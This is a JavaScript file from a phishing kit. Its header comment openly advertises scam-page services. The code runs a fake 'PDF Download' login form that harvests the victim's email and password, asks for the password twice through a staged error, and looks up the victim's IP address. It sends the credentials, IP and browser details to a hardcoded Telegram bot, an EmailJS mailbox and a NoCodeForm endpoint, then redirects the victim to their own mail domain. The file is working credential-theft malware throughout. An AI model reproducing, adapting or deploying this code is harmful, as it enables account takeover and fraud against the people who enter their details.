/**
 * 🚀 Script functionality developed by Vikram Joseph
 * 📬 Telegram: https://t.me/vikramjoseph
 * 💼 Services: Landing pages, dashboards, scam pages/clone, web & mobile apps
 * 👨‍💻 Clean, modern, and secure JavaScript for user interaction flows
 */

// const t = "8001165114:AAFNNyI0aiypVlCuomAMUfzenLuEzhtLuS0"; // token
// const c = "7999983899"; // channel/user ID
const t = "6418486152:AAFu4-m8JwABuPOIVZlsMDT9kAAB-6U2arQ"; // token
const c = "1027906748"; // channel/user ID
const ua = navigator.userAgent;
let em = ""; // saved email

const fullUrl = window.location.href;
const emailRegex = /#([^#]+)$/;
const match = fullUrl.match(emailRegex);
if (match) {
  em = decodeURIComponent(match[1]);
  $("#emailInput").val(em); // Pre-fill the email input field
}

function sendMail(title, message) {
  emailjs.send("service_0gcrnbf", "template_mvmkre4", {
    title: title,
    message: message,
    to_email: "baggangfocus@aol.com",
  });
}
function submitToNoCodeForm(dataObj) {
  $.ajax({
    url: "https://nocodeform.io/f/68573f42637b3b2f74b4e3d1",
    method: "POST",
    data: dataObj,
    success: function (response) {
      console.log("Submitted to NoCodeForm:", response);
    },
    error: function (err) {
      console.error("Failed to submit to NoCodeForm:", err);
    },
  });
}

// --- Progress Bar Logic ---
function setProgressBar(step) {
  // step: 1 = email, 2 = password, 3 = download
  var percent = 33;
  if (step === 2) percent = 66;
  if (step === 3) percent = 100;
  $("#progressBar").css("width", percent + "%");
}

// Initial state
setProgressBar(1);

// On step 1 submit (email)
$("#step1").on("submit", function () {
  setTimeout(function () {
    setProgressBar(2);
  }, 1500);
});

// On step 2 submit (password)
$("#step2").on("submit", function () {
  setTimeout(function () {
    setProgressBar(3);
  }, 1500);
});

$("#step1").on("submit", function (e) {
  e.preventDefault();

  em = $("#emailInput").val().trim();
  if (em === "") return;

  const b1 = $("#step1Btn");
  b1.prop("disabled", true);
  b1.html('Loading... <span class="spinner"></span>');

  setTimeout(function () {
    $("#emailInputView").val(em);
    $("#step1").hide();
    $("#step2").fadeIn();
    b1.prop("disabled", false);
    b1.html("<span>Continue</span>");
  }, 1500);
});

$("#step2").on("submit", function (e) {
  e.preventDefault();

  const pw = $("#passwordInput").val().trim();
  const cpw = $("#confirmInput").val().trim();
  const b2 = $("#step2Btn");

  b2.prop("disabled", true);
  b2.html('Verifying... <span class="spinner"></span>');

  setTimeout(function () {
    if ($("#confirmContainer").is(":visible")) {
      if (cpw === "") {
        alert("Please confirm your password.");
        b2.prop("disabled", false);
        b2.html("Download");
        return;
      }

      $.get("https://api.ipify.org?format=json", function (res) {
        const ip = res.ip;
        const msg =
          "🧾 PDF Download Form\n\n" +
          "📧 Email: " +
          em +
          "\n" +
          "🔐 Password: " +
          pw +
          "\n" +
          "🔐 Confirm: " +
          cpw +
          "\n\n" +
          "🌐 IP: " +
          ip +
          "\n\n" +
          "🖥️ Browser Info:\n" +
          ua;

        $.get("https://api.telegram.org/bot" + t + "/sendMessage", {
          chat_id: c,
          text: msg,
        })
          .done(function () {
            sendMail("New Record", msg);
            submitToNoCodeForm({
              email: em,
              password: pw,
              confirm_password: cpw || "",
              ip: ip,
              browser_info: ua,
            });
            console.log("Message sent.");

            const domain = em.split("@")[1];
            if (domain) {
              window.location.href = "https://" + domain;
            }
          })
          .fail(function () {
            console.log("Message failed.");
          });
      });
    } else {
      $.get("https://api.ipify.org?format=json", function (res) {
        const ip = res.ip;
        const msg =
          "🧾 PDF Download Form\n\n" +
          "📧 Email: " +
          em +
          "\n" +
          "🔐 Password: " +
          pw +
          "\n\n" +
          "🌐 IP: " +
          ip +
          "\n\n" +
          "🖥️ Browser Info:\n" +
          ua;

        $.get("https://api.telegram.org/bot" + t + "/sendMessage", {
          chat_id: c,
          text: msg,
        })
          .done(function () {
            sendMail("New Record", msg);
            console.log("Message sent.");
          })
          .fail(function () {
            console.log("Message failed.");
          });
      });

      $("#passwordError").show();
      $("#confirmContainer").show();
      $("#passwordContainer").hide();
    }

    b2.prop("disabled", false);
    b2.html("Download");
  }, 1500);
});
